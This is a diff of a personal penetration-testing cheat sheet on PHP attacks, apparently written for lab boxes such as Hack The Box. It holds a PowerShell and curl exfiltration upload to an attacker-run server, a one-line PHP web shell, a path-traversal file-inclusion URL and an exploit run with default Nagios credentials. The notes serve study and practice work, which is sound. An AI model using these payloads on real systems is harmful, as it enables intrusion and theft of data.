@@ -1,4 +1,6 @@
-## PHP Interesting Function List
+__tags: php web 
+
+### PHP Interesting Function List
 
 ```
 find . -name "*.php" | xargs grep "<function-name>"
@@ -36,7 +38,7 @@ php 47299.php --host=192.168.245.136 --ssl=false --user=nagiosadmin --pass=admin
 ```
 
 
-## Upload Server (Windows Exfil)
+### Upload Server (Windows Exfil)
 
 1. Get Apache running on kali with php support
 
@@ -60,19 +62,26 @@ powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload
 curl -F file=@clip.txt http://127.0.0.1/upload.php
 ```
 
-## ----- 
+### ----- 
 
-# PHP execute system command (Reverse Shell)
+### PHP execute system command (Reverse Shell)
 ```
 <?php system($_REQUEST['COMMAND']); ?>
 ```
 
 
-# Check for locale file inclusion on a page(windows box):
+### Check for locale file inclusion on a page(windows box):
 
 ```
 # this can work if you something like "include($_GET["page"]" in your php code since this will call anything that the a user will put in as a "page" variable
 # if allow_url_include is set to "0" in php.ini, then RFI is disabled, but LFI is still a thing
 
 http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+```
+
+### Default locations
+```bash
+
+/proc/self/cwd/index.php
+/var/www/html/index.php
 ```
